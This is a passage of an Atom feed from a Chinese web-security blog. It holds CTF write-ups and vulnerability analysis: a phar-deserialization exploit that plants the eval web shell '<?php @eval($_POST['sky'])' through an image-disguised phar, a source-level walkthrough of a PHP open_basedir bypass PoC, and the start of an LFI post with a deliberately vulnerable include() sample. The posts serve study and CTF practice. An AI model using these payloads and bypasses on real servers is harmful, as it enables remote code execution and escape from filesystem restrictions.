class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里可以看到几个过滤，首先对后缀名进行了过滤<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;php&apos;, &apos;php3&apos;, &apos;php4&apos;, &apos;php5&apos;</span><br></pre></td></tr></table></figure></p><p>然后进行了重命名，但这都不重要。我们可以构造图片后缀的phar文件，然后上传，结合file_exists()触发反序列化<br>构造如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Debug</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> $msg=<span class="string">'sky.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> $log=<span class="string">'&lt;?php @eval($_POST[\'sky\'])'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = serialize(<span class="keyword">new</span> Debug());</span><br><span class="line">$b = unserialize($a);</span><br><span class="line">$p = <span class="keyword">new</span> Phar(<span class="string">'./skyfuck.phar'</span>, <span class="number">0</span>);</span><br><span class="line">$p-&gt;startBuffering();</span><br><span class="line">$p-&gt;setStub(<span class="string">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">$p-&gt;setMetadata($b);</span><br><span class="line">$p-&gt;addFromString(<span class="string">'test.txt'</span>,<span class="string">'text'</span>);</span><br><span class="line">$p-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">'skyfuck.phar'</span>, <span class="string">'skyfuck.jpg'</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>上传图片后即可触发反序列化，通过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/down.php?filename=phar://uploads/1234.jpg</span><br></pre></td></tr></table></figure></p><p>即可任意写shell</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>听说两个cms一起有是7个洞 = =，先分析一下目前我找到的吧~有空再继续挖掘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于嘶吼</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上周参加了西湖论剑线下赛，在AD攻防赛中喜迎冠军，以下是AD攻防赛中2道web的题解。&lt;/p&gt;
&lt;h2 id=&quot;Web1-typecho&quot;&gt;
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>从PHP底层看open_basedir bypass</title>
    <link href="http://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/"/>
    <id>http://skysec.top/2019/04/12/从PHP底层看open-basedir-bypass/</id>
    <published>2019-04-12T02:30:21.000Z</published>
    <updated>2019-05-01T05:43:46.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="/images/2019-04-12-10-35-58.png" alt=""><br>有国外的大佬近日公开了一个php open_basedir bypass的poc，正好最近在看php底层，于是打算分析一下。</p><h2 id="poc测试"><a href="#poc测试" class="headerlink" title="poc测试"></a>poc测试</h2><p>首先测试一下:<br><img src="/images/2019-04-12-10-38-27.png" alt=""><br>我们用如上源码进行测试，首先设置open_basedir目录为/tmp目录，再尝试用ini_set设置open_basedir则无效果，我们对根目录进行列目录，发现无效，返回bool(false)。<br>我们再尝试一下该国外大佬的poc<br><img src="/images/2019-04-12-10-49-22.png" alt=""><br>发现可以成功列举根目录，bypass open_basedir。<br>那么为什么一系列操作后，就可以重设open_basedir了呢？我们一步一步从头探索。</p><h2 id="ini-set覆盖问题探索"><a href="#ini-set覆盖问题探索" class="headerlink" title="ini_set覆盖问题探索"></a>ini_set覆盖问题探索</h2><p>为什么连续使用ini_set不会对open_basedir进行覆盖呢？我们以如下代码为例:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(ini_get(<span class="string">'open_basedir'</span>));</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>, <span class="string">'/tmp'</span>);</span><br><span class="line">var_dump(ini_get(<span class="string">'open_basedir'</span>));</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>, <span class="string">'/'</span>);</span><br><span class="line">var_dump(ini_get(<span class="string">'open_basedir'</span>));</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>, <span class="string">'..'</span>);</span><br><span class="line">var_dump(ini_get(<span class="string">'open_basedir'</span>));</span><br></pre></td></tr></table></figure></p><p>运行后结果如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string(0) &quot;&quot;</span><br><span class="line">string(4) &quot;/tmp&quot;</span><br><span class="line">string(4) &quot;/tmp&quot;</span><br><span class="line">string(4) &quot;/tmp&quot;</span><br></pre></td></tr></table></figure></p><p>默认的open_basedir值本来是空，第一次设置成/tmp后，以为设置将不会覆盖。<br>我们来探索一下原因。首先找到php函数对应的底层函数:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ini_get : PHP_FUNCTION(ini_get)</span><br><span class="line">ini_set : PHP_FUNCTION(ini_set)</span><br></pre></td></tr></table></figure></p><p>这里我们主要看的是ini_set的流程，ini_get作为信息输出函数，我们不太关心<br>我们先对ini_set下断点，然后再run程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b /php7.0-src/ext/standard/basic_functions.c 5350</span><br><span class="line">r c.php</span><br></pre></td></tr></table></figure></p><p>程序跑起来后，首先是3个初始值<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zend_string *varname;</span><br><span class="line">zend_string *new_value;</span><br><span class="line"><span class="keyword">char</span> *old_value;</span><br></pre></td></tr></table></figure></p><p>然后进入词法分析，得到3个变量值<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (zend_parse_parameters(ZEND_NUM_ARGS(), <span class="string">"SS"</span>, &amp;varname, &amp;new_value) == FAILURE) &#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们可以看到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *varname</span><br><span class="line">$45 = &#123;</span><br><span class="line">  gc = &#123;</span><br><span class="line">    refcount = 0,</span><br><span class="line">    u = &#123;</span><br><span class="line">      v = &#123;</span><br><span class="line">        type = 6 &apos;\006&apos;,</span><br><span class="line">        flags = 2 &apos;\002&apos;,</span><br><span class="line">        gc_info = 0</span><br><span class="line">      &#125;,</span><br><span class="line">      type_info = 518</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  h = 15582417252668088432,</span><br><span class="line">  len = 12,</span><br><span class="line">  val = &quot;o&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这是zend_string的结构体,也是php7的新增结构:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_string</span> &#123;</span></span><br><span class="line">    zend_refcounted_h gc; <span class="comment">/*gc信息*/</span></span><br><span class="line">    zend_ulong        h;  <span class="comment">/* hash value */</span></span><br><span class="line">    <span class="keyword">size_t</span>            len; <span class="comment">/*字符串长度*/</span></span><br><span class="line">    <span class="keyword">char</span>              val[<span class="number">1</span>]; <span class="comment">/*字符串起始地址*/</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>我们可以看到varname.val为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;varname.val</span><br><span class="line">$46 = (char (*)[1]) 0x7ffff7064978</span><br><span class="line">pwndbg&gt; x/s $46</span><br><span class="line">0x7ffff7064978:&quot;open_basedir&quot;</span><br></pre></td></tr></table></figure></p><p>然后new_value.val为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;new_value.val</span><br><span class="line">$48 = (char (*)[1]) 0x7ffff7058ad8</span><br><span class="line">pwndbg&gt; x/s $48</span><br><span class="line">0x7ffff7058ad8:&quot;/tmp&quot;</span><br></pre></td></tr></table></figure></p><p>即我们最开始传入的两个参数。<br>然后程序拿到原来的open_basedir的value：<br><img src="/images/2019-04-12-11-50-22.png" alt=""><br><img src="/images/2019-04-12-11-50-14.png" alt=""><br>然后会进入<code>php_ini_check_path</code><br><img src="/images/2019-04-12-11-33-24.png" alt=""><br>由于第一次没有设置过open_basedir，所以直接跳出判断，进入下一步<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (zend_alter_ini_entry_ex(varname, new_value, PHP_INI_USER, PHP_INI_STAGE_RUNTIME, <span class="number">0</span>) == FAILURE) &#123;</span><br><span class="line">zval_dtor(return_value);</span><br><span class="line">RETURN_FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们跟进FAILURE，找到定义<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> &#123;</span><br><span class="line">  SUCCESS =  <span class="number">0</span>,</span><br><span class="line">  FAILURE = <span class="number">-1</span>,<span class="comment">/* this MUST stay a negative number, or it may affect functions! */</span></span><br><span class="line">&#125; ZEND_RESULT_CODE;</span><br></pre></td></tr></table></figure></p><p>当zend_alter_ini_entry_ex的返回值不为-1时，即代表更新成功，否则则会进入if，返回false<br>而经过比对发现:第一次设置open_basedir和第二次设置时候，正是这里的返回值不一样，第一次设置时，这里为SUCCESS，即0，而第二次设置为FAILURE，即-1，我们跟入zend_alter_ini_entry_ex进行比对：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b /php7.0-src/Zend/zend_ini.c:330</span><br></pre></td></tr></table></figure></p><p>发现两次不同的点在于如下判断：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!ini_entry-&gt;on_modify</span><br><span class="line">|| ini_entry-&gt;on_modify(ini_entry, duplicate, ini_entry-&gt;mh_arg1, ini_entry-&gt;mh_arg2, ini_entry-&gt;mh_arg3, stage) == SUCCESS)</span><br></pre></td></tr></table></figure></p><p>第一次时：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ini_entry-&gt;on_modify = 0x5d046e &lt;OnUpdateBaseDir&gt;</span><br><span class="line">ini_entry-&gt;on_modify(ini_entry, duplicate, ini_entry-&gt;mh_arg1, ini_entry-&gt;mh_arg2, ini_entry-&gt;mh_arg3, stage) = 0</span><br></pre></td></tr></table></figure></p><p>第二次时：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ini_entry-&gt;on_modify ：0x5d046e &lt;OnUpdateBaseDir&gt;</span><br><span class="line">ini_entry-&gt;on_modify(ini_entry, duplicate, ini_entry-&gt;mh_arg1, ini_entry-&gt;mh_arg2, ini_entry-&gt;mh_arg3, stage) = -1</span><br></pre></td></tr></table></figure></p><p>可以确定是<code>on_modify</code>，那么我们单步跟进，到达<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PHPAPI <span class="title">ZEND_INI_MH</span><span class="params">(OnUpdateBaseDir)</span></span></span><br></pre></td></tr></table></figure></p><p>发现在进行如下操作时，返回FAILURE：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (php_check_open_basedir_ex(ptr, <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">/* At least one portion of this open_basedir is less restrictive than the prior one, FAIL */</span></span><br><span class="line">efree(pathbuf);</span><br><span class="line"><span class="keyword">return</span> FAILURE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>正是<code>php_check_open_basedir_ex()</code>未通过才导致我们ini_set失败，而第一次的时候，这里是通过的。<br>所以最后的问题落在<code>php_check_open_basedir_ex</code>上，如果想要利用ini_set覆盖之前的open_basedir，那么必须通过该校验。</p><h2 id="php-check-open-basedir-ex"><a href="#php-check-open-basedir-ex" class="headerlink" title="php_check_open_basedir_ex"></a>php_check_open_basedir_ex</h2><p>找到切入点后，后面就是进行分析，看如何bypass php_check_open_basedir_ex<br>我们源码跟进这个函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">strlen</span>(path) &gt; (MAXPATHLEN - <span class="number">1</span>)) &#123;</span><br><span class="line">php_error_docref(<span class="literal">NULL</span>, E_WARNING, <span class="string">"File name is longer than the maximum allowed path length on this platform (%d): %s"</span>, MAXPATHLEN, path);</span><br><span class="line">errno = EINVAL;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXPATHLEN      PATH_MAX</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PATH_MAX                 1024   <span class="comment">/* max bytes in pathname */</span></span></span><br></pre></td></tr></table></figure><p>首先判断路径是否过长，是否超过1023。<br>然后是另一个校验函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (php_check_specific_open_basedir(ptr, path) == <span class="number">0</span>) &#123;</span><br><span class="line">    efree(pathbuf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>跟进后，该函数首先进行了操作<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(basedir, <span class="string">"."</span>) || !VCWD_GETCWD(local_open_basedir, MAXPATHLEN)) &#123;</span><br><span class="line"><span class="comment">/* Else use the unmodified path */</span></span><br><span class="line">strlcpy(local_open_basedir, basedir, <span class="keyword">sizeof</span>(local_open_basedir));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>比对当前目录，并赋值给local_open_basedir，然后继续看目录名长度是否合法<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">path_len = <span class="built_in">strlen</span>(path);</span><br><span class="line"><span class="keyword">if</span> (path_len &gt; (MAXPATHLEN - <span class="number">1</span>)) &#123;</span><br><span class="line">    <span class="comment">/* empty and too long paths are invalid */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后进入操作<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (expand_filepath(path, resolved_name) == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">PHPAPI <span class="keyword">char</span> *<span class="title">expand_filepath</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filepath, <span class="keyword">char</span> *real_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> expand_filepath_ex(filepath, real_path, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>将传入的path，用绝对路径保存在resolved_name。<br>然后操作继续进入判断<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (expand_filepath(local_open_basedir, resolved_basedir) != <span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure></p><p>将local_open_basedir的值存放于resolved_basedir。用于后面的比较<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">strncmp</span>(resolved_basedir, resolved_name, resolved_basedir_len) == <span class="number">0</span>) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (resolved_name_len &gt; resolved_basedir_len &amp;&amp; resolved_name[resolved_basedir_len - <span class="number">1</span>] != PHP_DIR_SEPARATOR) &#123;<span class="keyword">return</span> <span class="number">-1</span>;&#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* File is in the right directory */</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* /openbasedir/ and /openbasedir are the same directory */</span></span><br><span class="line">    <span class="keyword">if</span> (resolved_basedir_len == (resolved_name_len + <span class="number">1</span>) &amp;&amp; resolved_basedir[resolved_basedir_len - <span class="number">1</span>] == PHP_DIR_SEPARATOR) </span><br><span class="line">    &#123;            </span><br><span class="line">        <span class="keyword">if</span> (strncasecmp(resolved_basedir, resolved_name, resolved_name_len) == <span class="number">0</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strncmp</span>(resolved_basedir, resolved_name, resolved_name_len) == <span class="number">0</span>) </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>上述操作正是在匹配路径是否是open_basedir规定的路径。<br>那么不难发现，可控点应该就要追溯到之前的<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">expand_filepath()</span><br></pre></td></tr></table></figure></p><p>因为关键路径<code>resolved_name</code>和<code>resolved_basedir</code>均由这个函数生成。<br>所以要bypass php_check_open_basedir_ex的关键，在于bypass expand_filepath()。其获取到的path才是真正用来比对的path。</p><h2 id="expand-filepath"><a href="#expand-filepath" class="headerlink" title="expand_filepath()"></a>expand_filepath()</h2><p>我们跟进至：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PHPAPI <span class="keyword">char</span> *<span class="title">expand_filepath</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filepath, <span class="keyword">char</span> *real_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> expand_filepath_ex(filepath, real_path, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>继续跟expand_filepath_ex：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PHPAPI <span class="keyword">char</span> *<span class="title">expand_filepath_ex</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filepath, <span class="keyword">char</span> *real_path, <span class="keyword">const</span> <span class="keyword">char</span> *relative_to, <span class="keyword">size_t</span> relative_to_len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> expand_filepath_with_mode(filepath, real_path, relative_to, relative_to_len, CWD_FILEPATH);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>再跟expand_filepath_with_mode，来到关键操作位置<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (virtual_file_ex(&amp;new_state, filepath, <span class="literal">NULL</span>, realpath_mode)) &#123;</span><br><span class="line">efree(new_state.cwd);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>跟入virtual_file_ex得到关键语句：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!IS_ABSOLUTE_PATH(path, path_length)) &#123;</span><br><span class="line"><span class="keyword">if</span> (state-&gt;cwd_length == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">/* resolve relative path */</span></span><br><span class="line">start = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">memcpy</span>(resolved_path , path, path_length + <span class="number">1</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">int</span> state_cwd_length = state-&gt;cwd_length;</span><br><span class="line">          ......</span><br><span class="line">       state-&gt;cwd_length = path_length;</span><br><span class="line">          ......</span><br><span class="line">       <span class="built_in">memcpy</span>(state-&gt;cwd, resolved_path, state-&gt;cwd_length+<span class="number">1</span>);</span><br></pre></td></tr></table></figure></p><p>即目录拼接操作，如果path不是绝对路径，同时<code>state-&gt;cwd</code>长度为0，那么直接将path作为绝对路径，保存在resolved_path。否则则在state-&gt;cwd后拼接。<br>那么可以落点于path_length，这决定了我们拼接的长度<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">path_length = tsrm_realpath_r(resolved_path, start, path_length, &amp;ll, &amp;t, use_realpath, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure></p><p>跟进tsrm_realpath_r，不难发现主要操作用于<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">remove double slashes and &apos;.&apos;</span><br><span class="line">remove &apos;..&apos; and previous directory</span><br></pre></td></tr></table></figure></p><p>那么最后可以总结expand_filepath()全身心的投入在相对路径和绝对路径，没有考虑open_basedir如果为相对路径会实时变化的问题。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>所以最后的bypass poc也变得非常清楚：<br>首先需要构造一个相对可上跳的open_basedir<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">'sky'</span>);</span><br><span class="line">chdir(<span class="string">'sky'</span>);</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);</span><br></pre></td></tr></table></figure></p><p>这也是为什么要先创文件夹的原因，就是为了在当前目录构造可以<code>..</code>的ini_set<br>然后每次目录操作<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(<span class="string">'..'</span>);</span><br></pre></td></tr></table></figure></p><p>都会进行一次open_basedir的比对，即php_check_open_basedir_ex。由于相对路径的问题，每次open_basedir的补全都会上跳。<br>比如初试open_basedir为/a/b/c/d<br>第一次chdir后变为/a/b/c，<br>第二次chdir后变为/a/b，<br>第三次chdir后变为/a，<br>第四次chdir后变为/，<br>那么这时候再进行ini_set，调整open_basedir为/即可通过php_check_open_basedir_ex的校验，成功覆盖，导致我们可以bypass open_basedir。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这个poc还是很巧妙的，重点在于构造出相对路径的open_basedir，再触发其进行上跳！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于嘶吼</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/images/2019-04-12-10-35-58.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;有国外的大佬近日公开了一个php
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Some Trick About LFI</title>
    <link href="http://skysec.top/2019/04/08/Some-Trick-About-LFI/"/>
    <id>http://skysec.top/2019/04/08/Some-Trick-About-LFI/</id>
    <published>2019-04-08T05:35:30.000Z</published>
    <updated>2019-04-09T02:59:45.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近遇到一些文件包含的题目，在本篇文章记录两个trick~</p><h2 id="环境背景"><a href="#环境背景" class="headerlink" title="环境背景"></a>环境背景</h2><p>复现环境还是很容易搭建的：<br>例题1（php7）<br>index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = @$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'include $_GET[\'file\']'</span>;</span><br><span class="line"><span class="keyword">if</span> (strpos($a,<span class="string">'flag'</span>)!==<span class="keyword">false</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'nonono'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> $a;</span><br><span class="line"><span 